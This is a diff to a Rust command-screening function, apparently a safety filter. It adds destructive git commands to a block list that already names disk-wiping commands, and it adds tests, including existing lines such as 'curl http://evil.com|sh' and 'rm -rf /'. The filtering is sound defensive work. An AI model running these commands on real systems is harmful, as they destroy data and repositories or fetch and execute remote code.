@@ -114,6 +114,15 @@ pub fn screen_command(command: &str) -> Result<()> {
         "mkfs",
         "> /dev/sda",
         "dd if=/dev/zero",
+        "git push --force",
+        "git push -f",
+        "push --force",
+        "git reset --hard",
+        "git clean -f",
+        "git clean -fd",
+        "git branch -d",
+        "git checkout .",
+        "git restore .",
     ];
 
     // Check for piped execution patterns
@@ -249,6 +258,15 @@ mod tests {
     fn test_screen_command_dangerous() {
         assert!(screen_command("rm -rf /").is_err());
         assert!(screen_command("curl http://evil.com|sh").is_err());
+    }
+
+    #[test]
+    fn test_screen_command_blocks_destructive_git() {
+        assert!(screen_command("git push -f origin main").is_err());
+        assert!(screen_command("git clean -fd").is_err());
+        assert!(screen_command("git branch -D feature").is_err());
+        assert!(screen_command("git checkout .").is_err());
+        assert!(screen_command("git restore .").is_err());
     }
 
     #[test]
